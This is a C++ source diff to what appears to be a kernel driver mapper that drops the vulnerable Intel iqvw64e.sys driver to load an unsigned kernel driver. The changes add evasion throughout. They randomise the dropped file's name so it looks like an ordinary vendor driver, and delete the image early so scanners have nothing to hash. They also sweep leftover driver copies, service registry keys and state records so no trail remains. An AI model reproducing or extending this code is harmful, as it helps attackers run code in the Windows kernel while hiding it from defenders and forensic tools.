@@ -5,6 +5,7 @@
 #include "service.h"
 
 #include "res/iqvw_sys.h"
+#include "res/km_sys.h"
 #include "km_shared_loader.h"
 
 #include <cstdlib>
@@ -13,6 +14,7 @@
 
 #include <intrin.h>
 #include <fstream>
+#include <iterator>
 #include <vector>
 
 namespace
@@ -104,6 +106,10 @@ namespace
     KM_SHARED*      g_shared = nullptr;
     volatile LONG   g_sharedSlot = 0;
 
+    /* Set once the dropped host image is off disk, so the delete is idempotent and
+     * a failed removal can still be retried by a later call. */
+    bool            g_dropUnlinked = false;
+
     std::wstring RandomServiceName()
     {
         static const char alphanum[] =
@@ -141,10 +147,36 @@ namespace
         return std::wstring(buffer, buffer + len);
     }
 
+    /*
+     * File name for the dropped host. Kept separate from the service name: the two
+     * being the same string is a free correlation for anything that enumerates the
+     * directory and the registry together. Lowercase alphanumeric, so it reads like
+     * an ordinary vendor driver instead of a build artifact.
+     */
+    std::wstring RandomDropName()
+    {
+        static const char alphanum[] = "abcdefghijklmnopqrstuvwxyz0123456789";
+        char buffer[16] = { 0 };
+
+        srand((unsigned)time(nullptr) * GetCurrentThreadId() ^ GetTickCount());
+        const int len = rand() % 5 + 10;
+
+        for (int i = 0; i < len; ++i)
+            buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+
+        return std::wstring(buffer, buffer + len);
+    }
+
 }
 
 namespace nal
 {
+    /* Defined further down, next to HideTrail, where the string helpers are in
+     * scope. Declared here because Load() reaches them and their definitions sit
+     * below it. */
+    void SweepOrphans(bool hostResident);
+    void UnlinkDrop();
+
     bool CreateShared()
     {
         if (g_shared)
@@ -603,6 +635,14 @@ namespace nal
                 g_ownedService = !g_serviceName.empty();
 
                 /*
+                 * A crash that leaves \Device\Nal held lands here, not in the fresh
+                 * branch - so the sweep has to run on this path too, or the file the
+                 * crash left behind is the one that survives. The host is resident,
+                 * so nothing is stopped; its key and its file still go.
+                 */
+                SweepOrphans(true);
+
+                /*
                  * The recorded name belongs to the dead image, and its device
                  * object is still in the namespace holding it. Reusing it made
                  * IoCreateDevice collide. A fresh name is mapped against instead;
@@ -620,6 +660,14 @@ namespace nal
             return false;
         }
 
+        /*
+         * Clear out drops left by sessions that died before they could clean up. A
+         * bugcheck never reaches any teardown, so without this %TEMP% accumulates
+         * copies of iqvw64e - and a scanner that hashes the directory matches the
+         * host by whatever name it finds there.
+         */
+        SweepOrphans(false);
+
         g_serviceName = RandomServiceName();
         g_deviceName = RandomDeviceName();
 
@@ -630,7 +678,7 @@ namespace nal
             return false;
         }
 
-        g_driverPath = temp + L"\\" + g_serviceName + L".sys";
+        g_driverPath = temp + L"\\" + RandomDropName() + L".sys";
 
         if (!nt::CreateFileFromMemory(g_driverPath,
                                       reinterpret_cast<const char*>(iqvw64e_sys),
@@ -663,6 +711,13 @@ namespace nal
             _wremove(g_driverPath.c_str());
             return false;
         }
+
+        /*
+         * The device answers, so the image section now holds its own reference and
+         * the file is dead weight. Gone here rather than after the map: everything
+         * below this line can bugcheck, and a bugcheck runs no cleanup at all.
+         */
+        UnlinkDrop();
 
         ntoskrnlBase = nt::GetKernelBase();
 
@@ -801,21 +856,153 @@ namespace nal
         return true;
     }
 
-    void HideTrail()
+    std::wstring RandomImageName()
     {
-        if (g_driverPath.empty())
+        return RandomDropName() + L".sys";
+    }
+
+    /*
+     * Removes host images left behind by sessions that died mid-load, and the
+     * service keys that named them.
+     *
+     * Matched on exact bytes, never on the name, so an unrelated .sys in the
+     * directory is safe. The live host is skipped by name. A stale key is a second
+     * trail on its own - it names the file even after the file is gone - so the key
+     * goes with it.
+     */
+    void SweepOrphans(bool hostResident)
+    {
+        const std::wstring temp = nt::GetFullTempPath();
+        if (temp.empty())
             return;
 
         /*
-         * The image section holds its own reference to the file, so the driver
-         * keeps running and unloading still works. Only the directory entry goes.
-         * The path string is deliberately kept: the trace scrub keys off the file
-         * name, and the release path removes the file again (harmlessly).
+         * Nothing is kept by name: every candidate is matched on its bytes instead,
+         * so an unrelated .sys in the directory is never touched. When the host is
+         * still resident the caller says so and the service is left loaded.
          */
+        WIN32_FIND_DATAW found = { 0 };
+        HANDLE search = FindFirstFileW((temp + L"*.sys").c_str(), &found);
+        if (search == INVALID_HANDLE_VALUE)
+            return;
+
+        int removed = 0;
+
+        do
+        {
+            if (found.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                continue;
+
+            /*
+             * Matched on exact bytes of either image we drop - the host and the
+             * mapped driver - so the name can be anything and an unrelated .sys in
+             * the directory is never touched. Size first, as a cheap gate.
+             */
+            bool match = false;
+
+            if (found.nFileSizeLow == iqvw64e_sys_size || found.nFileSizeLow == km_sys_size)
+            {
+                const std::wstring path = temp + found.cFileName;
+                std::ifstream in(path, std::ios::binary);
+
+                if (in)
+                {
+                    std::string bytes((std::istreambuf_iterator<char>(in)),
+                                      std::istreambuf_iterator<char>());
+
+                    match = (bytes.size() == iqvw64e_sys_size &&
+                             bytes.compare(0, bytes.size(),
+                                           reinterpret_cast<const char*>(iqvw64e_sys),
+                                           iqvw64e_sys_size) == 0) ||
+                            (bytes.size() == km_sys_size &&
+                             bytes.compare(0, bytes.size(),
+                                           reinterpret_cast<const char*>(km_sys),
+                                           km_sys_size) == 0);
+                }
+            }
+
+            if (!match)
+                continue;
+
+            const std::wstring path = temp + found.cFileName;
+
+            /* Key first: it names the file, so it is the stronger of the two trails
+             * and the one to clear even if the file itself is somehow in use. */
+            service::RemoveKeyForImage(path, !hostResident);
+
+            if (_wremove(path.c_str()) != 0)
+                continue;
+
+            ++removed;
+        }
+        while (FindNextFileW(search, &found));
+
+        FindClose(search);
+
+        /*
+         * The state records go too. They hold the service name, the %TEMP% path and
+         * the device name on three plain lines - together, the strongest clue any of
+         * this leaves. Matched on age against this process's own start time, so the
+         * record this session writes later survives.
+         */
+        FILETIME created = { 0 };
+        FILETIME exited = { 0 };
+        FILETIME kernel = { 0 };
+        FILETIME user = { 0 };
+
+        GetProcessTimes(GetCurrentProcess(), &created, &exited, &kernel, &user);
+
+        WIN32_FIND_DATAW state = { 0 };
+        HANDLE states = FindFirstFileW((temp + L"km-*.state").c_str(), &state);
+
+        if (states != INVALID_HANDLE_VALUE)
+        {
+            do
+            {
+                if (CompareFileTime(&state.ftLastWriteTime, &created) >= 0)
+                    continue;
+
+                if (_wremove((temp + state.cFileName).c_str()) == 0)
+                    ++removed;
+            }
+            while (FindNextFileW(states, &state));
+
+            FindClose(states);
+        }
+
+        if (removed)
+            km_log::Step("swept %d stale trail(s) out of %%TEMP%%", removed);
+    }
+
+    /* Deletes the dropped host image. The image section holds its own reference, so
+     * the driver keeps running and unloading still works - what goes away is the
+     * file a scanner can hash, or read a version resource out of. Idempotent, and
+     * the path string is kept: the trace scrub and the release path still want it. */
+    void UnlinkDrop()
+    {
+        if (g_dropUnlinked || g_driverPath.empty())
+            return;
+
+        if (GetFileAttributesW(g_driverPath.c_str()) == INVALID_FILE_ATTRIBUTES)
+        {
+            g_dropUnlinked = true;
+            return;
+        }
+
         if (_wremove(g_driverPath.c_str()) == 0)
+        {
+            g_dropUnlinked = true;
             km_log::Step("dropped host image removed - nothing left on disk to hash");
+        }
         else
+        {
             km_log::Warn("could not remove %ls - the file stays on disk", g_driverPath.c_str());
+        }
+    }
+
+    void HideTrail()
+    {
+        UnlinkDrop();
 
         /*
          * The service key is an independent trail: it names the random driver and
@@ -824,7 +1011,8 @@ namespace nal
          * back from the same values instead of leaving it for the whole session.
          *
          * Owned service only - an adopted key belongs to whatever still holds the
-         * device.
+         * device. Removed even when the path is already gone, which is the normal
+         * case now that the image goes as soon as the device answers.
          */
         if (g_ownedService && !g_serviceName.empty() &&
             NT_SUCCESS(service::RemoveKey(g_serviceName)))
